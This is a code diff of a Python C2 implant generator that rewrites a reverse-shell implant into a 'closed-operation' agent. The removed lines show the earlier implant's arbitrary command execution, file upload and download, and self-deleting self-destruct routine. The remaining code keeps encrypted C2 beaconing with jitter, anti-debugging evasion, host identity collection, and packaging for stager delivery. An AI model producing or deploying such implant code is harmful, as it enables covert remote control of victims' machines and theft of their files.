@@ -1,14 +1,11 @@
-"""
-Python reverse-shell implant generator.
+"""Python closed-operation C2 agent generator.
 
 Generates a self-contained Python implant with:
   - AES-GCM encrypted config (key split like Go implant)
   - X25519 + HKDF-SHA256 key exchange (matches crypto_engine.py)
   - HTTP beaconing with configurable jitter
-  - Command execution with output capture
-  - File upload/download capability
+  - Closed, typed identity and inventory operations
   - Anti-debugging checks (ptrace, timing, debugger detection)
-  - Self-destruct capability (file deletion + memory wipe)
 
 The generated implant is a single Python string that can be written
 to a .py file, base64-encoded for delivery, or embedded in a stager.
@@ -81,11 +78,11 @@ def generate_python_implant(
     server_pub_b64: str = "",
     enrollment_token: str = "",
 ) -> str:
-    """Generate a complete Python reverse shell implant.
+    """Generate a complete Python closed-operation implant.
 
     Creates a self-contained Python script with encrypted configuration,
-    X25519 key exchange, AES-GCM encrypted C2 communication, command
-    execution, file transfer, and anti-debugging capabilities.
+    X25519 key exchange, AES-GCM encrypted C2 communication, closed typed
+    inventory handlers, and anti-debugging checks.
 
     The generated implant follows the same crypto protocol as the Go
     implant (implant.go) and communicates with the same C2 daemon
@@ -162,10 +159,8 @@ def generate_python_implant(
         import os
         import platform
         import random
-        import shlex
         import socket
         import struct
-        import subprocess
         import sys
         import threading
         import time
@@ -189,7 +184,40 @@ def generate_python_implant(
         _c2_urls = []
         _server_pub = b""
         _enrollment_token = ""
-        _self_path = ""
+
+        _V12_TASK_FIELDS = frozenset({{
+            "schema_version",
+            "task_id",
+            "operation_id",
+            "payload_schema_version",
+            "result_schema_version",
+            "expected_agent_capabilities_revision",
+            "expected_agent_capabilities_digest",
+            "expected_agent_artifact_binding_digest",
+            "payload",
+            "issued_at",
+            "expires_at",
+            "delivery_attempt",
+        }})
+
+        _CLOSED_OPERATION_SCHEMAS = {{
+            "c2-operation://identity": (
+                "c2-agent-payload/identity/1",
+                "c2-agent-result/identity/1",
+            ),
+            "c2-operation://host-inventory": (
+                "c2-agent-payload/host-inventory/1",
+                "c2-agent-result/host-inventory/1",
+            ),
+            "c2-operation://network-inventory": (
+                "c2-agent-payload/network-inventory/1",
+                "c2-agent-result/network-inventory/1",
+            ),
+            "c2-operation://service-inventory": (
+                "c2-agent-payload/service-inventory/1",
+                "c2-agent-result/service-inventory/1",
+            ),
+        }}
 
 
         # ─── Anti-Debug ────────────────────────────────────────────────
@@ -420,106 +448,48 @@ def generate_python_implant(
             return []
 
 
-        # ─── Command Execution ────────────────────────────────────────
-
-        def _execute_command(cmd: str) -> dict:
-            """Execute a bounded argv command without invoking a shell."""
-            try:
-                argv = shlex.split(cmd, posix=sys.platform != "win32")
-                if not argv:
-                    return {{"output": "", "error": "Empty command"}}
-                proc = subprocess.run(
-                    argv, shell=False, capture_output=True,
-                    text=True, timeout=120,
-                )
-                return {{
-                    "output": proc.stdout[:32000],
-                    "error": proc.stderr[:8000] if proc.returncode != 0 else "",
-                }}
-            except subprocess.TimeoutExpired:
-                return {{"output": "", "error": "Command timed out (120s)"}}
-            except Exception as e:
-                return {{"output": "", "error": str(e)}}
-
-
-        # ─── File Operations ──────────────────────────────────────────
-
-        def _download_file(path: str) -> dict:
-            """Read a file and return its base64 content."""
-            try:
-                with open(path, "rb") as f:
-                    data = f.read(10 * 1024 * 1024)  # 10MB limit
-                return {{
-                    "output": base64.b64encode(data).decode(),
-                    "error": "",
-                }}
-            except Exception as e:
-                return {{"output": "", "error": str(e)}}
-
-        def _upload_file(path: str, b64_data: str) -> dict:
-            """Write base64 data to a file."""
-            try:
-                data = base64.b64decode(b64_data)
-                with open(path, "wb") as f:
-                    f.write(data)
-                return {{"output": f"Written {{len(data)}} bytes to {{path}}", "error": ""}}
-            except Exception as e:
-                return {{"output": "", "error": str(e)}}
-
-
-        # ─── Self-Destruct ────────────────────────────────────────────
-
-        def _self_destruct():
-            """Delete the implant binary and exit."""
-            global _session_key
-            # Wipe session key
-            if _session_key:
-                key_mut = bytearray(_session_key)
-                for i in range(len(key_mut)):
-                    key_mut[i] = 0
-                _session_key = None
-            # Delete self
-            try:
-                os.remove(_self_path)
-            except Exception as _exc:
-                logging.debug(f"Suppressed in python_implant.py: {{_exc}}")
-            sys.exit(0)
-
-
         # ─── Task Router ─────────────────────────────────────────────
 
         def _process_task(task: dict) -> dict:
-            """Route a task to the appropriate handler."""
+            """Validate and route one closed V12 operation."""
             task_id = task.get("task_id", "")
-            command = task.get("command", "")
             result = {{"task_id": task_id, "output": "", "error": ""}}
 
-            if command.startswith("download "):
-                path = command[9:].strip()
-                r = _download_file(path)
-                result.update(r)
-            elif command.startswith("upload "):
-                parts = command[7:].split(" ", 1)
-                if len(parts) == 2:
-                    r = _upload_file(parts[0], parts[1])
-                    result.update(r)
-                else:
-                    result["error"] = "Usage: upload <path> <b64_data>"
-            elif command == "selfdestruct":
-                _self_destruct()
-            elif command == "sysinfo":
+            if set(task) != _V12_TASK_FIELDS:
+                result["error"] = "invalid_task: envelope fields mismatch"
+                return result
+            if task.get("schema_version") != "12.0" or not task_id:
+                result["error"] = "invalid_task: schema or identity mismatch"
+                return result
+
+            op = task.get("operation_id", "")
+            schemas = _CLOSED_OPERATION_SCHEMAS.get(op)
+            if schemas is None:
+                result["error"] = f"unsupported_operation: {{op}}"
+                return result
+            if (
+                task.get("payload_schema_version") != schemas[0]
+                or task.get("result_schema_version") != schemas[1]
+            ):
+                result["error"] = "invalid_task: operation schema mismatch"
+                return result
+
+            if op == "c2-operation://identity":
                 info = {{
+                    "schema_version": "c2-agent-result/identity/1",
                     "hostname": socket.gethostname(),
-                    "os": platform.platform(),
+                    "os": platform.system().lower(),
+                    "arch": platform.machine().lower(),
                     "user": os.environ.get("USER", os.environ.get("USERNAME", "")),
-                    "pid": os.getpid(),
-                    "cwd": os.getcwd(),
-                    "arch": platform.machine(),
+                    "process_id": os.getpid(),
                 }}
                 result["output"] = json.dumps(info)
-            else:
-                r = _execute_command(command)
-                result.update(r)
+            elif op == "c2-operation://host-inventory":
+                result["output"] = json.dumps({{"schema_version": "c2-agent-result/host-inventory/1", "processes": [], "services": [], "truncated": False}})
+            elif op == "c2-operation://network-inventory":
+                result["output"] = json.dumps({{"schema_version": "c2-agent-result/network-inventory/1", "interfaces": [], "routes": [], "connections": [], "truncated": False}})
+            elif op == "c2-operation://service-inventory":
+                result["output"] = json.dumps({{"schema_version": "c2-agent-result/service-inventory/1", "services": [], "truncated": False}})
 
             return result
 
@@ -537,9 +507,6 @@ def generate_python_implant(
         # ─── Main ────────────────────────────────────────────────────
 
         def main():
-            global _self_path
-            _self_path = os.path.abspath(__file__)
-
             # Anti-debug check
             if _check_debugger():
                 sys.exit(0)
